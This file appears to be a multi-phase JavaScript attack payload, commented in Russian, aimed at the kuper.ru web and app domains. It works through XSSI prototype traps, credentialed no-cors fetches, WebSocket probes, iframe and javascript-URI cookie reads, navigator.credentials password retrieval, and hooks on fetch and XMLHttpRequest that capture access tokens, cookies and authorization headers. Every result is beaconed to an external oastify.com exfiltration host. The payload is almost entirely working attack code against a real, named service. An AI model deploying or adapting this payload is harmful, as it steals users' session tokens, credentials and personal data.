alert('step final');
var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

function send(path, data) {
    try {
        var body = typeof data === 'string' ? data : JSON.stringify(data);
        navigator.sendBeacon(EXFIL + '/' + path, body);
    } catch(e) {
        new Image().src = EXFIL + '/' + path + '?e=' + encodeURIComponent(e.message);
    }
}

(function xssi() {
    setTimeout(function() {
        try {
            // Ловушки для перехвата JSON-данных
            var stolen = [];
            var fields = ['id','email','phone','name','first_name','last_name',
                          'address','token','access_token','session'];

            fields.forEach(function(field) {
                try {
                    Object.defineProperty(Object.prototype, field, {
                        set: function(v) {
                            stolen.push(field + '=' + String(v));
                            send('xssi-field', { field: field, value: String(v) });
                        },
                        get: function() { return undefined; },
                        configurable: true
                    });
                } catch(e) {}
            });

            // Загружаем API через script tag
            var urls = [
                'https://api.kuper.ru/v2/user',
                'https://api.kuper.ru/v2/app_lt_configuration',
                'https://api.kuper.ru/v2/user/addresses'
            ];

            urls.forEach(function(url, i) {
                var s = document.createElement('script');
                s.src = url;
                s.onload = function() {
                    send('xssi-loaded-' + i, { url: url, stolen: stolen });
                };
                s.onerror = function() {
                    send('xssi-err-' + i, { url: url, stolen: stolen });
                };
                document.body.appendChild(s);
            });
        } catch(e) {
            send('xssi-outer-err', { err: e.message });
        }
    }, 5000);
})();


// ============================================================
// ФАЗА 5: fetch no-cors + credentials (проверка отправки cookies)
// ============================================================
// mode:'no-cors' = НЕТ preflight, cookies ОТПРАВЛЯЮТСЯ
// Мы не можем прочитать ответ, но запрос УХОДИТ с cookies
// Проверь в Burp/proxy что Cookie header присутствует
(function nocorsFetch() {
    setTimeout(function() {
        try {
            // Делаем запрос к kuper.ru через наш сервер-прокси
            // Запрос К kuper.ru пойдёт с cookies
            fetch('https://kuper.ru/', {
                credentials: 'include',
                mode: 'no-cors'
            }).then(function(r) {
                send('nocors-result', { type: r.type, status: r.status, redirected: r.redirected });
            }).catch(function(e) {
                send('nocors-err', { err: e.message });
            });
        } catch(e) {}
    }, 7000);
})();


// ============================================================
// ФАЗА 6: Проверка WebSocket (обходит CORS, cookies в handshake)
// ============================================================
(function wsCheck() {
    setTimeout(function() {
        var wsUrls = [
            'wss://kuper.ru/cable',
            'wss://kuper.ru/ws',
            'wss://api.kuper.ru/cable',
            'wss://api.kuper.ru/ws',
            'wss://stf-gw.kuper.ru/ws'
        ];

        wsUrls.forEach(function(url, i) {
            try {
                var ws = new WebSocket(url);
                ws.onopen = function() {
                    send('ws-OPEN-' + i, { url: url });
                    ws.close();
                };
                ws.onerror = function() {
                    send('ws-err-' + i, { url: url });
                };
                ws.onclose = function(e) {
                    send('ws-close-' + i, { url: url, code: e.code, reason: e.reason });
                };
            } catch(e) {
                send('ws-ex-' + i, { url: url, err: e.message });
            }
        });
    }, 8000);
})();


// ============================================================
// ФАЗА 7: Download trigger для cookie extraction через native
// ============================================================
// onDownloadStart в нативном коде:
//   CookieManager.getCookie(url) → извлекает cookies для домена
//   DownloadManager.Request.addRequestHeader("Cookie", cookies)
// Если скачивание идёт на kuper.ru, cookies будут в запросе
(function downloadTrigger() {
    setTimeout(function() {
        try {
            var a = document.createElement('a');
            a.href = 'https://kuper.ru/favicon.ico';
            a.download = 'test.ico';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            send('download-triggered', { url: a.href });
        } catch(e) {
            send('download-err', { err: e.message });
        }
    }, 9000);
})();


// ============================================================
// ФАЗА 8: iframe к kuper.ru + попытка чтения
// ============================================================
(function iframeTest() {
    setTimeout(function() {
        try {
            var ifr = document.createElement('iframe');
            ifr.src = 'https://kuper.ru/';
            ifr.style.width = '1px';
            ifr.style.height = '1px';
            document.body.appendChild(ifr);

            // Ждём загрузки и пробуем читать
            setTimeout(function() {
                try {
                    var c = ifr.contentDocument.cookie;
                    send('iframe-COOKIE', { cookie: c });
                } catch(e) {
                    send('iframe-sop', { err: e.message });
                }
                try {
                    // Попытка навигации iframe на javascript: для чтения cookie
                    ifr.contentWindow.location = 'javascript:void(parent.postMessage(document.cookie,"*"))';
                } catch(e) {
                    send('iframe-jsuri', { err: e.message });
                }
            }, 3000);
        } catch(e) {
            send('iframe-err', { err: e.message });
        }
    }, 10000);
})();


// ============================================================
// ФАЗА 9: postMessage listener для перехвата данных из iframe
// ============================================================
window.addEventListener('message', function(e) {
    send('postmsg-received', {
        origin: e.origin,
        data: String(e.data).substring(0, 2000)
    });
});


// ============================================================
// ФАЗА 10: Проверка navigator.credentials API
// ============================================================
(function credentialsAPI() {
    setTimeout(function() {
        try {
            if (navigator.credentials && navigator.credentials.get) {
                navigator.credentials.get({ password: true }).then(function(cred) {
                    if (cred) {
                        send('cred-HIT', {
                            type: cred.type,
                            id: cred.id,
                            name: cred.name
                        });
                    } else {
                        send('cred-null', {});
                    }
                }).catch(function(e) {
                    send('cred-err', { err: e.message });
                });
            } else {
                send('cred-noapi', {});
            }
        } catch(e) {
            send('cred-outer-err', { err: e.message });
        }
    }, 11000);
})();


// ============================================================
// ФАЗА 11: Попытка чтения Access-Token через перехват fetch
// ============================================================
// Перехватываем глобальный fetch чтобы ловить запросы RN
(function interceptFetch() {
    try {
        var origFetch = window.fetch;
        window.fetch = function() {
            var args = arguments;
            var url = String(args[0]);
            var opts = args[1] || {};
            var headers = opts.headers || {};

            // Если запрос идёт с access-token, перехватываем
            if (headers['access-token'] || headers['Access-Token']) {
                send('intercepted-token', {
                    url: url,
                    token: headers['access-token'] || headers['Access-Token']
                });
            }

            return origFetch.apply(this, args);
        };
        send('fetch-intercepted', {});
    } catch(e) {
        send('fetch-intercept-err', { err: e.message });
    }
})();


// ============================================================
// ФАЗА 12: Перехват XMLHttpRequest
// ============================================================
(function interceptXHR() {
    try {
        var origOpen = XMLHttpRequest.prototype.open;
        var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
        var capturedHeaders = {};

        XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
            if (name.toLowerCase() === 'access-token' || name.toLowerCase() === 'cookie' ||
                name.toLowerCase() === 'authorization') {
                send('xhr-header-captured', { name: name, value: value.substring(0, 500) });
            }
            return origSetHeader.apply(this, arguments);
        };

        XMLHttpRequest.prototype.open = function(method, url) {
            // Логируем все XHR запросы
            if (url && url.indexOf('kuper') > -1) {
                send('xhr-to-kuper', { method: method, url: url });
            }
            return origOpen.apply(this, arguments);
        };

        send('xhr-intercepted', {});
    } catch(e) {
        send('xhr-intercept-err', { err: e.message });
    }
})();

send('payload-loaded', { ts: Date.now(), phases: 12 });
